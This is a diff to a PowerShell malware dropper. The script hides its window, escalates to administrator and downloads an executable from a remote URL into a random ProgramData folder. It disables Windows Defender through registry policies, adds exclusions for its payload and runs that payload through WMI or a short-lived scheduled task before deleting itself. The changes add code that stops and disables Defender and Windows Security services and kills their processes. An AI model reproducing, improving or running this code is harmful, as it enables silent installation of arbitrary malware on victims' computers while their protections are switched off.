@@ -4,9 +4,8 @@ $v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
 $v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".exe"
 
 if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
-$p=Start-Process powershell -ArgumentList ("-WindowStyle Hidden -Exec Bypass -Comm `"$($MyInvocation.MyCommand.Definition)`"") -Verb RunAs -PassThru
-while(!$p.HasExited){Start-Sleep -Milliseconds 100}
-exit
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
+    exit
 }
 
 Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
@@ -14,59 +13,77 @@ $c=[C.W]::GetConsoleWindow()
 [C.W]::ShowWindow($c,0)
 
 try{
-if(!(Test-Path $v3)){New-Item -Path $v3 -ItemType Directory -Force | Out-Null}
-(New-Object Net.WebClient).DownloadFile($v1,$v2)
-if(Test-Path $v2){Move-Item $v2 $v4 -Force}
+    if(!(Test-Path $v3)){New-Item -Path $v3 -ItemType Directory -Force | Out-Null}
+    (New-Object Net.WebClient).DownloadFile($v1,$v2)
+    if(Test-Path $v2){Move-Item $v2 $v4 -Force}
 
-$r=@(
-@{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";N="DisableAntiSpyware";V=1;T="DWord"},
-@{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableRealtimeMonitoring";V=1;T="DWord"}
-)
+    $r=@(
+        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";N="DisableAntiSpyware";V=1;T="DWord"},
+        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableRealtimeMonitoring";V=1;T="DWord"},
+        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableBehaviorMonitoring";V=1;T="DWord"},
+        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableOnAccessProtection";V=1;T="DWord"}
+    )
 
-foreach($s in $r){
-try{
-if(!(Test-Path $s.P)){New-Item -Path $s.P -Force | Out-Null}
-Set-ItemProperty -Path $s.P -Name $s.N -Value $s.V -Type $s.T -Force
-}catch{}
-}
+    foreach($s in $r){
+        try{
+            if(!(Test-Path $s.P)){New-Item -Path $s.P -Force | Out-Null}
+            Set-ItemProperty -Path $s.P -Name $s.N -Value $s.V -Type $s.T -Force
+        }catch{}
+    }
 
-$e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-if(!(Test-Path $e)){New-Item -Path $e -Force | Out-Null}
-try{
-New-ItemProperty -Path $e -Name $v4 -PropertyType String -Value "0" -Force
-New-ItemProperty -Path $e -Name $v3 -PropertyType String -Value "0" -Force
-}catch{}
+    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService","wscsvc")
+    foreach($service in $services){
+        try{
+            Stop-Service -Name $service -Force -ErrorAction Stop
+            Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
+            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
+        }catch{}
+    }
 
-Start-Sleep -Seconds 2
+    $processes = @("MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe","SecurityHealthSystray.exe")
+    foreach($process in $processes){
+        try{
+            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
+        }catch{}
+    }
 
-$m=@(
-{
-$w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
-$r=$w.Create("`"$v4`"")
-return $r.ReturnValue -eq 0
-},
-{
-$t="WU"+[System.IO.Path]::GetRandomFileName().Split('.')[0]
-$a=New-ScheduledTaskAction -Execute $v4
-$tr=New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(1) -Once
-Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Force | Out-Null
-Start-ScheduledTask -TaskName $t
-Start-Sleep -Seconds 2
-Unregister-ScheduledTask -TaskName $t -Confirm:$false
-return $true
-}
-)
+    $e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if(!(Test-Path $e)){New-Item -Path $e -Force | Out-Null}
+    try{
+        New-ItemProperty -Path $e -Name $v4 -PropertyType String -Value "0" -Force
+        New-ItemProperty -Path $e -Name $v3 -PropertyType String -Value "0" -Force
+    }catch{}
 
-$sc=$false
-foreach($mt in $m){
-try{if(& $mt){$sc=$true;break}}catch{}
-}
+    Start-Sleep -Seconds 2
 
-Start-Sleep -Seconds 3
-if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}
+    $m=@(
+        {
+            $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
+            $r=$w.Create("`"$v4`"")
+            return $r.ReturnValue -eq 0
+        },
+        {
+            $t="WU"+[System.IO.Path]::GetRandomFileName().Split('.')[0]
+            $a=New-ScheduledTaskAction -Execute $v4
+            $tr=New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(1) -Once
+            Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Force | Out-Null
+            Start-ScheduledTask -TaskName $t
+            Start-Sleep -Seconds 2
+            Unregister-ScheduledTask -TaskName $t -Confirm:$false
+            return $true
+        }
+    )
 
-$sp=$MyInvocation.MyCommand.Path
-if(Test-Path $sp){
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
-}
+    $sc=$false
+    foreach($mt in $m){
+        try{if(& $mt){$sc=$true;break}}catch{}
+    }
+
+    Start-Sleep -Seconds 3
+    if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}
+
+    $sp=$MyInvocation.MyCommand.Path
+    if(Test-Path $sp){
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
+    }
 }catch{}
